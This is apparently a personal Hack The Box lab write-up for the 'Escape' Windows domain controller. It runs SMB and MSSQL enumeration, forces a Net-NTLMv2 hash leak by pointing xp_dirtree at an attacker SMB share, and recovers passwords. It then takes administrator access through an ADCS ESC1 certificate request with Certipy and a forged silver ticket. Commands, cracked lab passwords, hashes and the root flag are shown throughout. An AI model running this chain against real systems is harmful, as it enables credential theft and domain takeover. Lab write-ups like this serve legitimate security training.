# Recon & Enum

### Rustscan & Nmap
```bash
awk -F: '{print $2}' rustscan.txt | paste -sd ","

nmap -p 53,88,135,139,389,445,464,593,636,1433,3269,3268,5985,9389,49667,49689,49690,49715,55196 -sC -sV $IP
```

This looks very much like a Windows domain controller, based on standard Windows stuff like SMB (445), NetBIOS (135/139), LDAP (389, etc), and WinRM (5985), as well as 53 (DNS) and 88 (Kerberos) typically seen listening on DCs. There’s also a MSSQL server (1433).

`3269/TCP` for LDAP Global Catalog over TLS/SSL

### 3269 TLS Cert
`openssl s_client -showcerts -connect $IP:3269 | openssl x509 -noout -text`

It’s interesting to note the certificate authority that issued the certificate, sequel-DC-CA

### SMB
##### smbclient
```bash
smbclient -N -L \\\\$IP

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 

smbclient \\\\$IP\\Public -U=anonymous
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Nov 20 00:51:25 2022
  ..                                  D        0  Sun Nov 20 00:51:25 2022
  SQL Server Procedures.pdf           A    49551  Sat Nov 19 02:39:43 2022

smbclient \\\\$IP\\Public -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Nov 20 00:51:25 2022
  ..                                  D        0  Sun Nov 20 00:51:25 2022
  SQL Server Procedures.pdf           A    49551  Sat Nov 19 02:39:43 2022

                5184255 blocks of size 4096. 1472093 blocks available
smb: \> get SQL Server Procedures.pdf 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \SQL
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (34.7 KiloBytes/sec) (average 34.7 KiloBytes/sec)
        ```

##### smbmap
```bash
smbmap -H $IP -u null -p ''

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.129.228.253:445      Name: sequel.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Public                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
        ```

##### crackmapexec
```bash
crackmapexec smb $IP --shares
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

crackmapexec smb $IP --shares -u '' -p ''
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\: 
SMB         10.129.228.253  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED

crackmapexec smb $IP --shares -u anonymous -p ''
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\anonymous: 
SMB         10.129.228.253  445    DC               [+] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share
```

### MSSQL
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#manual-enumeration
* https://github.com/search?q=repo%3AA1vinSmith%2FOSCP-PWK%20MSSQL&type=code

##### sqsh
```bash
sqsh -S $IP -U PublicUser -P 'GuestUserCantWrite1'

1> select *
2> from sys.databases;
3> go
```

##### mssqlclient
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#manual-enumeration

```bash
impacket-mssqlclient PublicUser@$IP -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[-] ERROR(DC\SQLMOCK): Line 1: Login failed for user 'sequel\Guest'

impacket-mssqlclient PublicUser@$IP
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL (PublicUser  guest@master)> select @@version;
                                                                                                                                                                                                                           
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
        Sep 24 2019 13:48:23 
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   

SQL (PublicUser  guest@master)> select user_name();
        
-----   
guest   

SQL (PublicUser  guest@master)> SELECT name FROM master.dbo.sysdatabases;
name     
------   
master   
tempdb   
model    
msdb 
```

There’s a bunch more enumeration I could do after the point with PDF creds:

    Check DNS for zone transfer / brute force sub-domains.
    Enumerate LDAP, with and without the creds.
    Use the creds to run Bloodhound.
    Use the creds to Kerberoast.
    Brute force usernames / passwords over Kerberos.

# Shell as sql_svc
### xp_cmdshell
failed

### Get Net-NTLMv2
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack

```bash
sudo tcpdump -i tun0

impacket-smbserver as . -smb2support

SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.4\evil
or EXEC MASTER.sys.xp_dirtree '\\10.10.14.14\test', 1, 1 using a UNC (Universal Naming Convention) path
subdirectory   depth   file   
------------   -----   ----

[*] Incoming connection (10.129.228.253,51551)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:581434152c1048c3f50698dae019f5ea:010100000000000080be6136df18da018036a36c313527ea00000000010010006f004200610058007000590058005200030010006f00420061005800700059005800520002001000560063004400470056004d006f00500004001000560063004400470056004d006f0050000700080080be6136df18da010600040002000000080030003000000000000000000000000030000025c594a40bc5fc8ef296b23ce6485673076bf40aaca49741584420d2333195830a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0034000000000000000000:REGGIE1234ronnie
```

`evil-winrm -i $IP -u sql_svc -p REGGIE1234ronnie`

Get it from `c:\sqlserver\logs`

```cmd
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

# Shell as Ryan.Cooper
`evil-winrm -i $IP -u Ryan.Cooper -p NuclearMosquito3`

# Shell as administrator
### Enumeration
##### Identify ADCS
Active Directory Certificate Services (ADCS). A quick way to check for this is using crackmapexec (and it works as either `sql_svc` or `Ryan.Cooper`):

```bash
crackmapexec ldap $IP -u ryan.cooper -p NuclearMosquito3 -M adcs
crackmapexec ldap $IP -u sql_svc -p REGGIE1234ronnie -M adcs

SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.228.253  636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
ADCS                                                Found PKI Enrollment Server: dc.sequel.htb
ADCS                                                Found CN: sequel-DC-CA
```

##### Identify Vulnerable Template via Certify.exe
Looking back at our initial enumeration output from Nmap we can see a lot of certificate related output. This is a strong indication that there is a Certificate Authority running. 

With ADCS running, the next question is if there are any templates in this ADCS that are insecurely configured. To enumerate further, I’ll upload a copy of Certify by downloading a copy from SharpCollection, and uploading it to Escape:

* https://github.com/ly4k/Certipy

* https://github.com/A1vinSmith/SharpCollection/blob/master/NetFramework_4.7_x64/Certify.exe
* https://github.com/A1vinSmith/Ghostpack-CompiledBinaries
* https://github.com/GhostPack/Certify

* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#abuse
* https://www.thehacker.recipes/ad/movement/ad-cs

```cmd evil-winrm
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> upload /home/alvin/Documents/OSEP/HTB/Windows/Escape/Certify.exe
                                        
Info: Uploading /home/alvin/Documents/OSEP/HTB/Windows/Escape/Certify.exe to C:\Users\Ryan.Cooper\Desktop\Certify.exe
                                        
Data: 17584 bytes of 17584 bytes copied
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\Certify.exe find /vulnerable

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS <- It contains ENROLLEE_SUPPLIES_OBJECT. The templeate is vulnerable to the ESC1 scenario. https://m365internals.com/2022/11/07/investigating-certificate-template-enrollment-attacks-adcs/
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
```

The danger here is that sequel\Domain Users has Enrollment Rights for the certificate (this is scenario 3 in the Certify README). Enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set (ESC1).

##### Exploit it via certify
```bash
certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target dc.sequel.htb -template UserAuthentication
certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target dc.sequel.htb -template UserAuthentication -upn 'administrator@sequel.htb'

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 13
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Note: If you get the error The NETBIOS connection with the remote host timed out. please re-run the command via `sudo ntpdate -u dc.sequel.htb`. (Now that we have a certificate for the administrator we can use certipy once more to get a Ticket Granting Ticket (TGT) and extract the NT hash for this user. Since this step requires some Kerberos interaction, we
need to synchronize our clock to the time of the remote machine before we can proceed.)

Then you can transform the generated certificate to `.pfx` format and use it to authenticate using Rubeus or certipy again:

```bash
sudo ntpdate -u sequel.htb
2023-11-17 23:33:48.667895 (+1300) +28799.884939 +/- 0.066782 sequel.htb 10.10.11.202 s1 no-leap
CLOCK: time stepped by 28799.884939

certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'sequel.htb' -dc-ip $IP

faketime '2023-11-17 23:33:48' certipy auth -pfx 'administrator.pfx'

Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee

evil-winrm -i $IP -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

`faketime` save the day!

# Bonus with Silver Ticket
The way that this machine is set up allows for another interesting solution. More specifically, this alternative
approach requires us to have at least reached the point that we have the clear text password for the user
sql_svc . This step is extremely important since this is a user account that runs the MSSQL service meaning
that tickets to access this service will be encrypted with the password of the sql_svc user.

* https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html

Following the logic of a Silver Ticket attack we could be able to forge a ticket in behalf of the user
Administrator to access the MSSQL service. Unfortunately, there is no Service Principal Name (SPN) set
for this service instance so Kerberos isn't able to produce a valid Service Ticket for us that we could then try
and alter.

In this case, we can use ticketer from impacket. This script, has the benefit that the ticket creation is done
locally, meaning that there is no need to contact Kerberos on the remote machine and ask for a Service
Ticket. Moreover, we have to keep in mind that the service is responsible for validating presented tickets
and not Kerberos. So, even if Kerberos is unaware that MSSQL is running under sql_svc if we manage to
craft a valid ticket locally for the Administrator user we should be able to access the service as this user.

### NTLM hash generator
```bash
Python 3.11.6 (main, Oct  8 2023, 05:06:43) [GCC 13.2.0] on linux

>>> import hashlib
>>> hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest()
b'\x14C\xec\x19\xdaM\xacO\xfc\x95;\xca\x1bW\xb4\xcf'
>>> hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().hex()
'1443ec19da4dac4ffc953bca1b57b4cf'
```

* https://codebeautify.org/ntlm-hash-generator

### Domain SID
```cmd
evil-winrm -i $IP -u sql_svc -p REGGIE1234ronnie
*Evil-WinRM* PS C:\Users\sql_svc\Documents> Get-ADDomain | fl DomainSID

DomainSID : S-1-5-21-4078382237-1492182817-2568127209
```

### Generate
The `spn` parameter is needed to produce a valid ticket but we can place anything we want since it's not set
to begin with.

```bash
/usr/share/doc/python3-impacket/examples/ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn doesnotmatter/dc.sequel.htb administrator

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sequel.htb/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache

export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k dc.sequel.htb
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[-] ERROR(DC\SQLMOCK): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
sudo ntpdate -u sequel.htb
[sudo] password for alvin: 
2023-11-18 00:25:50.129929 (+1300) +28799.890695 +/- 0.068800 sequel.htb 10.10.11.202 s1 no-leap
CLOCK: time stepped by 28799.890695
faketime '2023-11-18 00:26:00' impacket-mssqlclient -k dc.sequel.htb
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sequel\Administrator  dbo@master)>
```

### Read flags
```bash
SQL (sequel\Administrator  dbo@master)>  SELECT * FROM OPENROWSET(BULK N'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) AS Contents
BulkColumn                                
---------------------------------------   
b'4316530eeff3ed7c70aa631cbbc3dff7\r\n'
```

### RCE
```bash
SQL (sequel\Administrator  dbo@master)> enable_xp_cmdshell
[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sequel\Administrator  dbo@master)> sp_configure 'xp_cmdshell', '1'
[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sequel\Administrator  dbo@master)> RECONFIGURE
SQL (sequel\Administrator  dbo@master)> enable_xp_cmdshell
[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   

NULL             
```

The commands are still running as sql_svc. That’s because sql_svc is still the process running the MSSQL service. It is just able to negotiate with the OS to read file as administrator because it has that ticket.

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---privileged-file-write
* https://0xdf.gitlab.io/2023/06/17/htb-escape.html#silver-ticket